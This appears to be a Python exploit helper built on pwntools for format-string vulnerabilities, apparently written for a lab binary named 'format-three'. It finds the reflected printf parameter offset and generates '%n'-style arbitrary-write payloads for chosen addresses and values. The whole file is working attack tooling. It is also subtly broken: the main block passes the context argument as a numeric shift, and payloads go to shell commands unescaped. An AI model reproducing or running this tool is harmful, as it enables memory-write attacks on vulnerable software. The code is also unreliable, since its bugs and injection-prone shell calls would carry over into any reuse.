#!/bin/env python3
import subprocess
from pwn import p64, p32
import sys


# Added code to help hexencode strings and bytes
def hexify(inp_bytes):
    inp_bytes = inp_bytes[::-1]
    out = ""
    if type(inp_bytes) == str:
        for x in inp_bytes:
            out += hex(ord(x))[2:]
    elif type(inp_bytes) == bytes:
        for x in inp_bytes:
            out += hex(x)[2:]
    out = "0x" + out
    return out


def plain_print(inp):
    if type(inp) == str:
        inp = inp.encode()
        sys.stdout.buffer.write(inp)
    elif type(inp) == bytes:
        sys.stdout.buffer.write(inp)


def sanitize_where(where):
    addr = []
    for x in where:
        if type(x) == int:
            addr.append(x)
        elif type(x) == str:
            try:
                addr.append(int(x, 16))
            except ValueError:
                print("ERROR: Input Format Error")
                exit()
        else:
            print("ERROR: Input Format Error")
            exit()
    return addr

# Helper function to interact with given binary
# using stdin, arguments & environment


def tbin(binary, pld,  method="stdin"):
    if method == "stdin":
        res = subprocess.check_output(
            "python2 -c 'print " + '"' + pld + '"' + "'" + "|" + binary, shell=True)
    elif method == "args":
        res = subprocess.check_output(binary + " '" + pld + "'", shell=True)
    elif method == "env":
        res = subprocess.check_output(
            "python2 -c 'print " + '"' + pld + '"' + "'" + "| ./bin/format-three", shell=True)
    return res


# Detects format string vuln when our input is reflected in output
# it returns the parameter of the printf where our input resides
def reflector(binary, attempts=100, method="stdin"):
    out = []
    for x in range(attempts):
        pld = "A"*8 + " %" + str(x) + "$p"
        res = tbin(binary, pld, method).decode('utf-8')
        if "4141414141414141" in res:
            out.append(x)
    return out

# Todo : remove


def whr_pss(inp):
    HX = inp
    if type(inp) == str:
        HX = int(HX, 16)

    HX = hex(HX)[2:]

    HX_len = len(HX)//2
    while (HX_len % 4 != 0):
        HX = '00' + HX
        HX_len = len(HX) // 2

    for x in range(HX_len):
        arr = chr(int(HX[2*x:2*(x+1)], 16))
        # print()


# Format string design
# cprinter writer padding address

def cprinter(what):
    for x in range(len(what)):
        if x != 0:
            what[-x] = what[-x] - what[-x-1]

    for x in range(len(what)):
        if what[x] < 10:
            what[x] = "A" * what[x]
        else:
            what[x] = "%" + str(what[x]) + "x"
    return what


# The mistic function that house the magic of binary relm
def writer(c2print, steps, param_offset, ptr_size=8):
    pld = ""
    if steps == 4:
        bytes2write = ""
    elif steps == 2:
        bytes2write = "h"
    elif steps == 1:
        bytes2write = "hh"

    len_c2print = 0
    for x in c2print:
        len_c2print += len(x)

    expected_length = len_c2print + \
        len(c2print) * (len(bytes2write) + 3 + len(str(param_offset)))
    # print(expected_length)

    while True:
        padding = ""
        next_param = param_offset
        while(expected_length % ptr_size != 0):
            padding += "A"
            expected_length += 1

        fmt = []
        for x in c2print:
            fmt.append("%" + str(next_param + expected_length //
                                 ptr_size) + "$" + bytes2write + "n")
            next_param += 1

        pld = ""
        for x in range(len(fmt)):
            pld = pld + c2print[x] + fmt[x]
        pld += padding

        if expected_length != len(pld):
            expected_length = len(pld) - len(padding)
        else:
            # print(len(pld))
            # print(pld)
            return pld

# takes care of size of given input and extra padding
# to clear off exxess bytes (residue from previous value)


def prep_bytes(what, steps):
    order = []
    final = []
    split_bytes = []
    for p in range(len(what)):
        hx = what[p][2:]
        while ((len(hx)//2) % 4 != 0):
            hx = "00" + hx
        hx_len = len(hx)//2

        split_byte = []
        for x in range(hx_len//steps):
            byte = int("0x" + hx[2 * x * steps: 2 * (x + 1) * steps], 16)
            split_byte.append(byte)
        split_bytes.append(split_byte)
        final = sorted(final + split_byte)

    for x in final:
        for split_byte in split_bytes:
            if x in split_byte:
                order.append(
                    (split_byte.index(x), split_bytes.index(split_byte)))
                split_byte[split_byte.index(x)] = "XX"

    return final, order


def write(content,  param_offset,  shift=0, context="compact", platform="amd64"):
    what = list(content.values())
    where = list(content.keys())
    addr = sanitize_where(where)
    if platform == "amd64":
        ptr_size = 8
        pack = p64
    elif platform == "x86":
        pack = p32
        ptr_size = 4

    for x in range(len(what)):
        try:
            int(what[x], 16)
        except ValueError:
            what[x] = hexify(what[x])

    if context == "safe":
        steps = 1
    elif context == "risky" or int(max(what), 16) < 0xffff:
        steps = 4       # 1, 2, 4
    else:
        steps = 2

    final, order = prep_bytes(what, steps)
    print(final)
    min_final = min(final)
    for x in range(len(final)):
        final[x] = final[x] - shift

    final = cprinter(final)

    fmt = writer(final, steps, param_offset, ptr_size)
    fmt += '_'*(shift % ptr_size)
    # print("=> " + fmt)
    fmt = fmt.encode()

    # print("order: " + str(order))
    # print(final)
    # print("addr: " + str(addr))
    # print("\n\n")
    for i in range(len(order)):

        x = order[i]
        marker = x[1]
        tmp = []
        for o in order:
            if o[1] == marker:
                tmp.append(o[0])
        max_splits = max(tmp)

        # print("i: " + str(i))
        # print("addr_index: " + str(marker))
        # print("x: " + str(x))
        # print("addr[addr_index]: " + hex(addr[marker] + steps * (max_splits-x[0])))
        # print("-------\n")

        fmt += pack(addr[marker] + steps * (max_splits - x[0]))
        # fmt += b" " + hex(addr[marker] + steps * (max_splits - x[0])).encode()

    return fmt


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()

    parser.add_argument("-w", "--write", help="Write to some location")
    parser.add_argument("-v", "--value", help="What to write")
    parser.add_argument("-l", "--loc", help="Where to write")
    parser.add_argument(
        "-o", "--offset", help="Parameter offset for reflected input")
    parser.add_argument("-c", "--context",
                        help="safe means stable, compact means small")

    parser.add_argument("-b", "--binary", help="Location of binary")
    parser.add_argument(
        "-i", "--method", help="Method to interact with binary")
    parser.add_argument("-a", "--attempts", help="Number of offsets to test")
    parser.add_argument("-p", "--preinput",
                        help="input required to reach printf")

    args = parser.parse_args()

    if args.write:
        what = args.value.split(",")
        where = args.loc.split(",")
        content = dict(zip(where, what))
        if len(what) != len(where):
            print("Error: no of values do not match no of addresses")
            exit(2)

        pld = write(content, int(args.offset), args.context)
        # print(len(pld))
        plain_print(pld)
    elif args.binary:
        if args.attempts:
            attempts = int(args.attempts)
        else:
            attempts = 100
        print(reflector(args.binary, attempts, args.method))
